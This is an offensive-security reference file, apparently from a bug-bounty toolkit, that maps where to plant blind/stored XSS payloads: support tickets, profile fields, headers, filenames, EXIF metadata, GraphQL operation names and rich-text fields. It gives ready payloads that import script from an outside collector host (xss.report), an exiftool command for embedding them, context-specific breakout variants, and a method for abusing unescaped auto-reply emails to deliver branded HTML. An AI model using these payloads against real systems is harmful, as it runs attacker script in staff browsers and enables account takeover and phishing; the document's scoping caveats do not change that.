# Injection Points — the blind/stored XSS spray map

This map is for stored or blind candidates after the main `xss` workflow has established the input context. Plant only on controlled or anonymous objects and use unique attribution tags so every delayed render maps back to one exact input and payload variant.

Blind XSS fires where **someone other than you renders your stored input**. Rank every input by how reliably an internal viewer displays it, then plant a tagged payload on all of them. For each point record: _field name_ (where it stores), _likely renderer_ (which internal viewer), _encoding context_ (HTML body / attribute / JS string / URL / markdown). The renderer is the whole game — an input no privileged viewer ever displays is not a blind-XSS candidate.

## Tier 1 — almost always rendered by staff / an internal engine

The highest-yield family. These flow into admin, support, ops, or billing tools that were never hardened like the customer front-end.

- **Support / contact / help-desk tickets** — `subject`, `message`, `body`, `order number`, `reference`, and any "custom field". Rendered in the agent console (Zendesk-style internal views, custom dashboards). Fire on _both_ the free-text and the "structured" fields; the structured ones are often echoed raw in the agent's list view.
- **Refund / dispute / chargeback forms** — reviewed by ops staff in bespoke internal tools with near-zero XSS hardening. Reason, description, evidence-note fields.
- **Profile / account fields an admin sees** — `company name`, `billing name`, `display name`, `full name`, `bio`, `about`, `custom URL / website`, `address`, `job title`, `phone`, and any **"internal note"** field. These surface in the admin user-list, the audit log, and the "impersonate / view customer" panel.
- **Account / display / org name** — appears in admin user lists, audit logs, notification emails rendered to staff, and Slack/Teams webhook cards ops watch.
- **Invoice / receipt / billing line-item descriptions** — rendered into **PDFs by headless Chrome** and into the billing admin view. This input is double value: stored XSS in the billing viewer **and** the entry point for the PDF-engine chain (file-read / SSRF / RCE — see `escalation.md`).
- **Order / shipping / delivery notes** — printed on packing slips and shown in the fulfilment/ops console.

## Tier 2 — headers & upload metadata that log / analytics viewers echo verbatim

Set the value at the transport layer; internal log, analytics, SIEM, and session-replay viewers frequently render these **raw**. This is the classic "User-Agent / Referer sniffing" surface.

- **User-Agent** — set the browser UA (or the request header) to the tagged payload. Log viewers, analytics dashboards, admin "recent sessions", device lists, and fraud/risk consoles render UA raw.
- **Referer** — same class of viewer; also "traffic source" / "where did this signup come from" panels.
- **X-Forwarded-For / X-Real-IP / CF-Connecting-IP / Forwarded** — shown in IP-history and geo/risk tables in many admin tools.
- **Other persisted request fields** — custom headers, cookie _values_, and request bodies that get logged and later surfaced in a debug/log viewer.
- **Uploaded filename** — rendered in admin file viewers, shared-link previews, PDF/document metadata, and "recent uploads" lists. Inject in the filename itself: `"><svg onload=import('//xss.report/c/d0x/?src=filename')>.png`.
- **EXIF / image metadata** — `Artist`, `Copyright`, `ImageDescription`, `UserComment`, `DocumentName` fields are sometimes parsed and displayed in media admin tools. Write the payload with `exiftool`: `exiftool -Artist='"><svg onload=import("//xss.report/c/d0x/?src=exif")>' img.jpg`.
- **OAuth `client_name` / app name** — when registering an OAuth app / integration, the app name is rendered in the provider's admin consent screens and app-review dashboards.

## Tier 3 — lower frequency, high payoff when they land

- **API-key / token / webhook / integration labels** — the "name" field for a key or webhook renders in the admin integration list and security-review tooling.
- **Custom error strings from external integrations** — e.g. metadata / statement descriptors echoed from a payment or shipping provider back into an internal reconciliation viewer.
- **Admin notes / comments on customer accounts** — one staff member's note is read by another; a payload here is admin→admin.
- **CSV / XLSX / report exports** — a cell you control (`=`-prefixed or plain text) rendered in a browser-based spreadsheet/report viewer. (Distinct from CSV _formula_ injection; here it is HTML-context render of the cell.)
- **The outbound auto-reply itself — where YOU choose the recipient.** Every entry above waits for a privileged viewer. This one does not: an unauthenticated contact/support/ "request a demo"/waitlist endpoint takes a `message` (and often a `name`) and mails a branded confirmation to whatever address is in the `email` field. If the body is not escaped, the target's own mail infrastructure delivers **your** HTML to **anyone**, from a real brand address, passing SPF/DKIM, inside the official template.
  - probe with `<a href=https://<oob>/CLICK>verify</a>` in `message` and your own address in `email` — never a third party's inbox;
  - check `name` too, it usually lands in the greeting and lets the mail impersonate an internal team;
  - a **click** on that link reaches you directly with the reader's real IP, UA and timestamp — mail clients proxy remote _images_, they do not proxy navigation. That is the reliable read-side signal here, so use a link, not an `<img>`.
  - **Converts poorly on its own** — a corpus report of exactly this closed **informative**, because the class reads as phishing assistance and many policies exclude it. It becomes a real finding when the same unescaped field is also rendered to **staff** (then it is blind XSS, above) or when the endpoint lets you reach a real user's inbox with a credential-capture form and the policy scopes that in. Check the policy before spending a turn, and never mail a payload to someone who did not consent — that is a third party, and it is out of bounds regardless of scope.
  - Corpus case: `3591626` — `h1/reports/3591626-manscaped-informative.md`.
- **The GraphQL operation name.** `query <HERE> { … }` is a free-form client-chosen label that is not a resolver input — which is why nothing sanitizes it — and applications record it for analytics, tracing and **audit consoles that staff read**. Stored now, rendered later, by a privileged viewer, in a surface you cannot see: the exact shape this file exists for. Probe the allowed character set with something harmless first, since implementations differ. `../../graphql/references/injection-forgery.md` has the payload placement.
- **Email signature / out-of-office / auto-reply** — if rendered to staff in a shared inbox or agent view.
- **Calendar / meeting / event titles & descriptions**, **team / project / workspace names**, **tag / label names** — rendered across other members' and admins' views in collaboration products.
- **Rich-text / CKEditor / TinyMCE fields** rendered to staff — HTML is often stored and re-rendered; `<img src=x onerror=import('//xss.report/c/d0x/')>` in the email/comment body.

## Encoding-context cheat: pick the payload variant per point

- Free-text HTML body → `<svg/onload=...>` (primary).
- Value inside a quoted attribute → break out with `"><svg onload=...>` or `'><svg onload=...>`.
- Value inside `<title>`/`<textarea>`/`<style>`/`<script>` → close the element first (`</title>...`, `</textarea>...`, etc.).
- Value placed in an `href`/`src` → `javascript:import('//xss.report/c/d0x/')`.
- Value interpolated into a JS string → `';import('//xss.report/c/d0x/');//`.
- Markdown-rendered field → `[x](javascript:import('//xss.report/c/d0x/'))` or raw HTML if the renderer allows it.

Full variant + bypass ladder in `payloads.md`. Log every planted point in the spray ledger (`targets/<program>/notes/xss-spray.md`) with its tag so a landed callback maps back to the exact input.
